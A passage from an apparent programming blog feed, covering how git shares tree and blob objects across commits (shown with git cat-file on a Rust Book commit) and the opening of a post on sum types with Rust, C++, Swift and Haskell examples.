reference to the file the diff must be applied to.</p>

<p>We can see this at work using <code>git cat-file</code>. <code>cat-file</code> lets you view objects in
the &ldquo;git filesystem&rdquo;, which is basically a bunch of hash-indexed objects stored in
<code>.git/objects</code>. You can view them directly by traversing that directory (they&rsquo;re
organized as a trie), but <code>cat-file -p</code> will let you pretty-print their contents
since they&rsquo;re stored in a binary format.</p>

<p>I&rsquo;m working with <a href="https://github.com/rust-lang/book">the repo for the Rust Book</a>,
playing with commit <a href="4822f2baa69c849e4fa3b85204f219a16bde2f42"><code>4822f2</code></a>. It&rsquo;s a commit that changes
just one file (<code>second-edition/src/ch15-01-box.md</code>), perfect.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git show 4822f2baa69c849e4fa3b85204f219a16bde2f42
</span><span class='line'>commit 4822f2baa69c849e4fa3b85204f219a16bde2f42
</span><span class='line'>Author: Jake Goulding &lt;...&gt;
</span><span class='line'>Date:   Fri Mar <span class="m">3</span> 14:07:24 <span class="m">2017</span> -0500
</span><span class='line'>
</span><span class='line'>    Reorder sentence about a generic cons list.
</span><span class='line'>
</span><span class='line'>diff --git a/second-edition/src/ch15-01-box.md b/second-edition/src/ch15-01-box.md
</span><span class='line'>index 14c5533..29d8793 100644
</span><span class='line'>--- a/second-edition/src/ch15-01-box.md
</span><span class='line'>+++ b/second-edition/src/ch15-01-box.md
</span><span class='line'><span class="o">(</span>diff omitted<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>git cat-file -p 4822f2baa69c849e4fa3b85204f219a16bde2f42
</span><span class='line'>
</span><span class='line'>tree ec7cd2821d4bcbafe08f3eca6ea60487bfdc1b52
</span><span class='line'>parent 24cd100e061bb11c3f7f3219467d6d644c50d811
</span><span class='line'>author Jake Goulding &lt;...&gt; <span class="m">1488568044</span> -0500
</span><span class='line'>committer GitHub &lt;noreply@github.com&gt; <span class="m">1488568044</span> -0500
</span><span class='line'>
</span><span class='line'>Reorder sentence about a generic cons list.
</span></code></pre></td></tr></table></div></figure>


<p>This tells us that the commit is a thing with some author information, a pointer to
a parent, a commit message, and a &ldquo;tree&rdquo;. What&rsquo;s this tree?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git cat-file -p ec7cd2821d4bcbafe08f3eca6ea60487bfdc1b52
</span><span class='line'><span class="m">100644</span> blob 4cab1f4d267628ab5f4f7c14b1b64a9d4b032409    .gitattributes
</span><span class='line'><span class="m">040000</span> tree e1dcc1c754d72450b03542b2106fcb67c78805ff    .github
</span><span class='line'><span class="m">100644</span> blob 4c699f440ac134c577cb6f67b04ec5b93c652440    .gitignore
</span><span class='line'><span class="m">100644</span> blob e86d887d84a839417c960faf877c9057a8dc6823    .travis.yml
</span><span class='line'><span class="m">100644</span> blob 7990f2738876fc0fbc2ca30f5f91e91745b0b8eb    README.md
</span><span class='line'><span class="m">040000</span> tree 17b33cb52a5abb67ff678a03e7ed88cf9f163c69    ci
</span><span class='line'><span class="m">040000</span> tree 0ffd2c1238345c1b0e99af6c1c618eee4a0bab58    first-edition
</span><span class='line'><span class="m">100644</span> blob 5d1d2bb79e1521b28dd1b8ff67f9b04f38d83620    index.md
</span><span class='line'><span class="m">040000</span> tree b7160f7d05d5b5bfe28bad029b1b490e310cff22    redirects
</span><span class='line'><span class="m">040000</span> tree d5672dd9ef15adcd1527813df757847d745e299a    second-edition
</span></code></pre></td></tr></table></div></figure>


<p>This is just a directory! You can see that each entry has a hash. We can use
<code>git cat-file -p</code> to view each one. Looking at a <code>tree</code> object will just give
us a subdirectory, but the <code>blob</code>s will show us actual files!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git cat-file -p 7990f2738876fc0fbc2ca30f5f91e91745b0b8eb <span class="c"># Show README</span>
</span><span class='line'><span class="c"># The Rust Programming Language</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>!<span class="o">[</span>Build Status<span class="o">](</span>https://travis-ci.org/rust-lang/book.svg?branch<span class="o">=</span>master<span class="o">)](</span>https://travis-ci.org/rust-lang/book<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>To <span class="nb">read </span>this book online, visit <span class="o">[</span>rust-lang.github.io/book/<span class="o">][</span>html<span class="o">]</span>.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>rest of file omitted<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So how does this share objects? Let&rsquo;s look at the previous commit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git cat-file -p 4822f2baa69c849e4fa3b85204f219a16bde2f42^ <span class="c"># `^` means &quot;parent&quot;</span>
</span><span class='line'>tree d219be3c5010f64960ddb609a849fc42a01ad31b
</span><span class='line'>parent 21c063868f9d7fb0fa488b6f1124262f055d275b
</span><span class='line'>author steveklabnik &lt;...&gt; <span class="m">1488567224</span> -0500
</span><span class='line'>committer steveklabnik &lt;...&gt; <span class="m">1488567239</span> -0500
</span><span class='line'>
</span><span class='line'>mdbook needs to be on the PATH <span class="k">for</span> deploy
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>git cat-file -p d219be3c5010f64960ddb609a849fc42a01ad31b <span class="c"># the tree</span>
</span><span class='line'><span class="m">100644</span> blob 4cab1f4d267628ab5f4f7c14b1b64a9d4b032409    .gitattributes
</span><span class='line'><span class="m">040000</span> tree e1dcc1c754d72450b03542b2106fcb67c78805ff    .github
</span><span class='line'><span class="m">100644</span> blob 4c699f440ac134c577cb6f67b04ec5b93c652440    .gitignore
</span><span class='line'><span class="m">100644</span> blob e86d887d84a839417c960faf877c9057a8dc6823    .travis.yml
</span><span class='line'><span class="m">100644</span> blob 7990f2738876fc0fbc2ca30f5f91e91745b0b8eb    README.md
</span><span class='line'><span class="m">040000</span> tree 17b33cb52a5abb67ff678a03e7ed88cf9f163c69    ci
</span><span class='line'><span class="m">040000</span> tree 0ffd2c1238345c1b0e99af6c1c618eee4a0bab58    first-edition
</span><span class='line'><span class="m">100644</span> blob 5d1d2bb79e1521b28dd1b8ff67f9b04f38d83620    index.md
</span><span class='line'><span class="m">040000</span> tree b7160f7d05d5b5bfe28bad029b1b490e310cff22    redirects
</span><span class='line'><span class="m">040000</span> tree d48b2e06970cf3a6ae65655c340922ae69723989    second-edition
</span></code></pre></td></tr></table></div></figure>


<p>If you look closely, all of these hashes are the same, <em>except</em> for the hash for <code>second-edition</code>.
For the hashes which are the same, these objects are being shared across commits. The differing hash
is <code>d5672d</code> in the newer commit, and <code>d48b2e</code> in the older one.</p>

<p>Let&rsquo;s look at the objects:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git cat-file -p d5672d
</span><span class='line'><span class="m">100644</span> blob 82dc67a6b08f0eb62420e4da3b3aa9c0dc10911a    CONTRIBUTING.md
</span><span class='line'><span class="m">100644</span> blob 5cd51aa43f05416996c4ef055df5d6eb58fbe737    Cargo.lock
</span><span class='line'><span class="m">100644</span> blob 7ab2575fa5bf4abf6eaf767c72347580c9f769dd    Cargo.toml
</span><span class='line'><span class="m">100644</span> blob 96e9f0458b55a4047927de5bf04ceda89d772b2b    LICENSE-APACHE
</span><span class='line'><span class="m">100644</span> blob 5a56e6e8ed1909b4e4800aa8d2a0e7033ab4babe    LICENSE-MIT
</span><span class='line'><span class="m">100644</span> blob be1135fc6d28eca53959c7fc9ae191523e4bc96f    book.json
</span><span class='line'><span class="m">100644</span> blob 1400454f36840e916a7d7028d987c42fcb31b4db    dictionary.txt
</span><span class='line'><span class="m">100644</span> blob 5103c84d034d6e8a0e4b6090453ad2cdcde21537    doc-to-md.sh
</span><span class='line'><span class="m">040000</span> tree 6715d1d4c97e3d17a088922f687b8d9ffacb5953    dot
</span><span class='line'><span class="m">100644</span> blob f9e045c4c1824520534270a2643ebe68311503b8    nostarch.sh
</span><span class='line'><span class="m">040000</span> tree f8d9a9452b4bbaeba256b95d40b303cd5fb20a64    nostarch
</span><span class='line'><span class="m">100644</span> blob 0a2d16852c11355ef9d8758a304b812633dcf03c    spellcheck.sh
</span><span class='line'><span class="m">040000</span> tree 3f8db396566716299330cdd5f569fb0a0c4615dd    src
</span><span class='line'><span class="m">100644</span> blob 56677811f451084de7c3a2478587a09486209b14    style-guide.md
</span><span class='line'><span class="m">040000</span> tree 7601821a2ff38906332082671ea23e4074464dd2    tools
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>git cat-file -p d48b2e
</span><span class='line'><span class="m">100644</span> blob 82dc67a6b08f0eb62420e4da3b3aa9c0dc10911a    CONTRIBUTING.md
</span><span class='line'><span class="m">100644</span> blob 5cd51aa43f05416996c4ef055df5d6eb58fbe737    Cargo.lock
</span><span class='line'><span class="m">100644</span> blob 7ab2575fa5bf4abf6eaf767c72347580c9f769dd    Cargo.toml
</span><span class='line'><span class="m">100644</span> blob 96e9f0458b55a4047927de5bf04ceda89d772b2b    LICENSE-APACHE
</span><span class='line'><span class="m">100644</span> blob 5a56e6e8ed1909b4e4800aa8d2a0e7033ab4babe    LICENSE-MIT
</span><span class='line'><span class="m">100644</span> blob be1135fc6d28eca53959c7fc9ae191523e4bc96f    book.json
</span><span class='line'><span class="m">100644</span> blob 1400454f36840e916a7d7028d987c42fcb31b4db    dictionary.txt
</span><span class='line'><span class="m">100644</span> blob 5103c84d034d6e8a0e4b6090453ad2cdcde21537    doc-to-md.sh
</span><span class='line'><span class="m">040000</span> tree 6715d1d4c97e3d17a088922f687b8d9ffacb5953    dot
</span><span class='line'><span class="m">100644</span> blob f9e045c4c1824520534270a2643ebe68311503b8    nostarch.sh
</span><span class='line'><span class="m">040000</span> tree f8d9a9452b4bbaeba256b95d40b303cd5fb20a64    nostarch
</span><span class='line'><span class="m">100644</span> blob 0a2d16852c11355ef9d8758a304b812633dcf03c    spellcheck.sh
</span><span class='line'><span class="m">040000</span> tree f9fc05a6ff78b8211f4df931ed5e32c937aba66c    src
</span><span class='line'><span class="m">100644</span> blob 56677811f451084de7c3a2478587a09486209b14    style-guide.md
</span><span class='line'><span class="m">040000</span> tree 7601821a2ff38906332082671ea23e4074464dd2    tools
</span></code></pre></td></tr></table></div></figure>


<p>Again, these are the same, except for that of <code>src</code>. <code>src</code> has a <em>lot</em> of files in it,
which will clutter this post, so I&rsquo;ll run a diff on the outputs of <code>cat-file</code>:</p>

<pre><code class="udiff">$ diff -U5 &lt;(g cat-file -p f9fc05a6ff78b8211f4df931ed5e32c937aba66c) &lt;(g cat-file -p 3f8db396566716299330cdd5f569fb0a0c4615dd)
--- /dev/fd/63  2017-03-05 11:58:22.000000000 -0800
+++ /dev/fd/62  2017-03-05 11:58:22.000000000 -0800
@@ -63,11 +63,11 @@
 100644 blob ff6b8f8cd44f624e1239c47edda59560cdf491ae   ch14-02-publishing-to-crates-io.md
 100644 blob c53ef854a74b6c9fbd915be1bf824c6e78439c42   ch14-03-cargo-workspaces.md
 100644 blob 3fb59f9cc85b6b81994e83a34d542871a260a8f0   ch14-04-installing-binaries.md
 100644 blob e1cd1ca779fdf202af433108a8af6eda317f2717   ch14-05-extending-cargo.md
 100644 blob 3173cc508484cc447ebe42a024eac7d9e6c2ddcd   ch15-00-smart-pointers.md
-100644 blob 14c5533bb3b604c6e6274db278d1e7129f78d55d   ch15-01-box.md
+100644 blob 29d87933d6832374b87d98aa5588e09e0c1a4991   ch15-01-box.md
 100644 blob 47b35ed489d63ce6a885289fec01b7b16ba1afea   ch15-02-deref.md
 100644 blob 2d20c55cc8605c0c899bc4867adc6b6ea1f5c902   ch15-03-drop.md
 100644 blob 8e3fcf4e83fe1ce985a7c0b479b8b16701765aaf   ch15-04-rc.md
 100644 blob a4ade4ae8bf5296d79ed51d69506e71a83f9f489   ch15-05-interior-mutability.md
 100644 blob 3a4db5616c4f5baeb95d04ea40c6747e60181684   ch15-06-reference-cycles.md
</code></pre>

<p>As you can see, only the file that was changed in the commit has a new blob stored.
If you view <code>14c553</code> and <code>29d879</code> you&rsquo;ll get the pre- and post- commit versions
of the file respectively.</p>

<p>So basically, each commit stores a tree of references to objects, often sharing nodes
with other commits.</p>

<p>I haven&rsquo;t had the opportunity to work with packfiles much, but they&rsquo;re an
additional optimization on top of this. <a href="https://codewords.recurse.com/issues/three/unpacking-git-packfiles">Aditya&rsquo;s post</a> is a good
intro to these.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What Are Sum, Product, and Pi Types?]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/03/04/what-are-sum-product-and-pi-types/"/>
    <updated>2017-03-04T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/03/04/what-are-sum-product-and-pi-types</id>
    <content type="html"><![CDATA[<p><em>See also: <a href="https://tonyarcieri.com/a-quick-tour-of-rusts-type-system-part-1-sum-types-a-k-a-tagged-unions">Tony&rsquo;s post on the same topic</a></em></p>

<p>You often hear people saying &ldquo;Language X<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> has sum types&rdquo; or &ldquo;I wish language X had sum types&rdquo;<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>,
or &ldquo;Sum types are cool&rdquo;.</p>

<p>Much like fezzes and bow ties, sum types are indeed cool.</p>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/memes/sum-types-are-cool.jpg" width="400"></p>

<p>These days, I&rsquo;ve also seen people asking about &ldquo;Pi types&rdquo;, because of <a href="https://github.com/ticki/rfcs/blob/pi-types-2/text/0000-pi-types.md">this Rust RFC</a>.</p>

<p>But what does &ldquo;sum type&rdquo; mean? And why is it called that? And what, in the name of sanity, is
a Pi type?</p>

<p>Before I start, I&rsquo;ll mention that while I will be covering some type theory to explain the names
&ldquo;sum&rdquo; and &ldquo;product&rdquo;, you don&rsquo;t need to understand these names to use these things! Far too often
do people have trouble understanding relatively straightforward concepts in languages because
they have confusing names with confusing mathematical backgrounds<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>.</p>

<h2>So what&rsquo;s a sum type? (the no-type-theory version)</h2>

<p>In it&rsquo;s essence, a sum type is basically an &ldquo;or&rdquo; type. Let&rsquo;s first look at structs.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span><span class="o">:</span> <span class="kt">bool</span><span class="p">,</span>
</span><span class='line'>    <span class="n">y</span><span class="o">:</span> <span class="n">String</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>Foo</code> is a <code>bool</code> AND a <code>String</code>. You need one of each to make one.
This is an &ldquo;and&rdquo; type, or a &ldquo;product&rdquo; type (I&rsquo;ll explain the name later).</p>

<p>So what would an &ldquo;or&rdquo; type be? It would be one where the value can be a
<code>bool</code> OR a <code>String</code>. You can achieve this with C++ with a union:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">union</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">bool</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>    <span class="n">string</span> <span class="n">y</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">foo</span><span class="p">.</span><span class="n">x</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span> <span class="c1">// set it to a bool</span>
</span><span class='line'><span class="n">foo</span><span class="p">.</span><span class="n">y</span> <span class="o">=</span> <span class="s">&quot;blah&quot;</span><span class="p">;</span> <span class="c1">// set it to a string</span>
</span></code></pre></td></tr></table></div></figure>


<p>However, this isn&rsquo;t <em>exactly</em> right, since the value doesn&rsquo;t store the information
of which variant it is. You could store <code>false</code> and the reader wouldn&rsquo;t know
if you had stored an empty <code>string</code> or a <code>false</code> <code>bool</code>.</p>

<p>There&rsquo;s a pattern called &ldquo;tagged union&rdquo; (or &ldquo;discriminated union&rdquo;) in C++ which bridges this gap.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">union</span> <span class="n">FooUnion</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">bool</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>    <span class="n">string</span> <span class="n">y</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">enum</span> <span class="n">FooTag</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">BOOL</span><span class="p">,</span> <span class="n">STRING</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">FooUnion</span> <span class="n">data</span><span class="p">;</span>
</span><span class='line'>    <span class="n">FooTag</span> <span class="n">tag</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// set it to a bool</span>
</span><span class='line'><span class="n">foo</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">x</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span><span class='line'><span class="n">foo</span><span class="p">.</span><span class="n">tag</span> <span class="o">=</span> <span class="n">BOOL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// set it to a string</span>
</span><span class='line'><span class="n">foo</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">y</span> <span class="o">=</span> <span class="s">&quot;blah&quot;</span><span class="p">;</span>
</span><span class='line'><span class="n">foo</span><span class="p">.</span><span class="n">tag</span> <span class="o">=</span> <span class="n">STRING</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here, you manually set the tag when setting the value. C++ also has <code>std::variant</code> (or
<code>boost::variant</code>) that encapsulates this pattern with a better API.</p>

<p>While I&rsquo;m calling these &ldquo;or&rdquo; types here, the technical term for such types is &ldquo;sum&rdquo; types.
Other languages have built-in sum types.</p>

<p>Rust has them and calls them &ldquo;enums&rdquo;. These are a more generalized version of the
enums you see in other languages.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">enum</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">Str</span><span class="p">(</span><span class="n">String</span><span class="p">),</span>
</span><span class='line'>    <span class="nb">Bool</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">foo</span> <span class="o">=</span> <span class="n">Foo</span><span class="o">::</span><span class="nb">Bool</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// &quot;pattern matching&quot;</span>
</span><span class='line'><span class="k">match</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">Str</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="cm">/* do something with string `s` */</span><span class="p">,</span>
</span><span class='line'>    <span class="nb">Bool</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="cm">/* do something with bool `b` */</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Swift is similar, and also calls them enums</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='swift'><span class='line'><span class="k">enum</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">case</span> <span class="n">str</span><span class="p">(</span><span class="n">String</span><span class="p">)</span>
</span><span class='line'>    <span class="k">case</span> <span class="n">boolean</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">let</span> <span class="n">foo</span> <span class="o">=</span> <span class="n">Foo</span><span class="p">.</span><span class="n">boolean</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>
</span><span class='line'><span class="k">switch</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">case</span> <span class="p">.</span><span class="n">str</span><span class="p">(</span><span class="k">let</span> <span class="n">s</span><span class="p">)</span><span class="o">:</span>
</span><span class='line'>        <span class="c1">// do something with string `s`</span>
</span><span class='line'>    <span class="k">case</span> <span class="p">.</span><span class="n">boolean</span><span class="p">(</span><span class="k">let</span> <span class="n">b</span><span class="p">)</span><span class="o">:</span>
</span><span class='line'>        <span class="c1">// do something with boolean `b`</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can fake these in Go using interfaces, as well. Typescript has built-in
unions which can be typechecked without any special effort, but you need
to add a tag (like in C++) to pattern match on them.</p>

<p>Of course, Haskell has them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='haskell'><span class='line'><span class="kr">data</span> <span class="kt">Foo</span> <span class="ow">=</span> <span class="kt">B</span> <span class="kt">Bool</span> <span class="o">|</span> <span class="kt">S</span> <span class="kt">String</span>
</span><span class='line'>
</span><span class='line'><span class="c1">-- define a function</span>
</span><span class='line'><span class="nf">doThing</span> <span class="ow">::</span> <span class="kt">Foo</span> <span class="ow">-&gt;</span> <span class="kt">SomeReturnType</span>
</span><span class='line'><span class="nf">doThing</span> <span class="p">(</span><span class="kt">B</span> <span class="n">b</span><span class="p">)</span> <span class="ow">=</span> <span class="c1">-- do something with boolean b</span>
</span><span class='line'><span class="nf">doThing</span> <span class="p">(</span><span class="kt">S</span> <span class="n">s</span><span class="p">)</span> <span class="ow">=</span> <span class="c1">-- do something with string s</span>
</span><span class='line'>
</span><span class='line'><span class="c1">-- call it</span>
</span><span class='line'><span class="nf">doThing</span> <span class="p">(</span><span class="kt">S</span> <span class="s">&quot;blah&quot;</span><span class="p">)</span>
</span><span class='line'><span class="nf">doThing</span> <span class="p">(</span><span class="kt">B</span> <span class="kt">True</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>One of the very common things that languages with sum types do is express nullability
as a sum type;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// an Option is either &quot;something&quot;, containing a type, or &quot;nothing&quot;</span>
</span><span class='line'><span class="k">enum</span> <span class="nb">Option</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">Some</span><span class="p">(</span><span class="n">T</span><span class="p">),</span>
</span><span class='line'>    <span class="nb">None</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="nb">Some</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">match</span> <span class="n">x</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">Some</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">),</span>
</span><span class='line'>    <span class="nb">None</span> <span class="o">=&gt;</span> <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;no string for you&quot;</span><span class="p">),</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Generally, these languages have &ldquo;pattern matching&rdquo;, which is like a <code>switch</code>
statement on steroids. It lets you match on and destructure all kinds of things,
sum types being one of them. Usually, these are &ldquo;exhaustive&rdquo;, which means that
you are forced to handle all possible cases. In Rust, if you remove that <code>None</code>
branch, the program won&rsquo;t compile. So you&rsquo;re forced to deal with the none case,
<em>somehow</em>.</p>

<p>In general sum types are a pretty neat and powerful tool. Languages with them built-in
tend to make heavy use of them, almost as much as they use structs.</p>

